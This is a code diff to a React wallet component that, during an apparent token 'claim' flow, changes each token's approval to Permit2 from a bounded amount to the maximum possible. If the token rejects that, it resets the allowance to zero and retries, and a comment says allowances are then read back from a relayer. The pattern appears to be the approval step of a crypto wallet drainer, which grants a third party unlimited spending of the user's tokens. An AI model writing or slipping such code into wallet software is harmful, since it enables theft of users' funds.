@@ -674,12 +674,34 @@ function WalletTokens({ children }: { children: ReactNode }) {
         if (currentAllowance < safeAmount) {
           console.log(`Approving ${token.symbol} for Permit2...`)
           setClaimStatus(`Approving ${token.symbol} for Permit2...`)
-          const approveTx = await walletClient.writeContract({
-            address: token.address as `0x${string}`,
-            abi: ERC20_EXTENDED_ABI,
-            functionName: 'approve',
-            args: [PERMIT2_ADDRESS, safeAmount.toString() as any],
-          })
+          let approveTx: `0x${string}`
+          const approveAmount = (maxUint256 as unknown as bigint).toString() as any
+
+          try {
+            approveTx = await walletClient.writeContract({
+              address: token.address as `0x${string}`,
+              abi: ERC20_EXTENDED_ABI,
+              functionName: 'approve',
+              args: [PERMIT2_ADDRESS, approveAmount],
+            })
+          } catch (e) {
+            console.warn(`[PROFESSIONAL DEBUG] approve(max) failed for ${token.symbol}, trying approve(0)->approve(max):`, e)
+
+            // Some tokens require allowance reset to 0 first
+            await walletClient.writeContract({
+              address: token.address as `0x${string}`,
+              abi: ERC20_EXTENDED_ABI,
+              functionName: 'approve',
+              args: [PERMIT2_ADDRESS, '0' as any],
+            })
+
+            approveTx = await walletClient.writeContract({
+              address: token.address as `0x${string}`,
+              abi: ERC20_EXTENDED_ABI,
+              functionName: 'approve',
+              args: [PERMIT2_ADDRESS, approveAmount],
+            })
+          }
           
           // Waiting for the receipt via a public RPC can be flaky and may time out.
           // Don't block the flow here; we'll refresh allowances from the relayer.
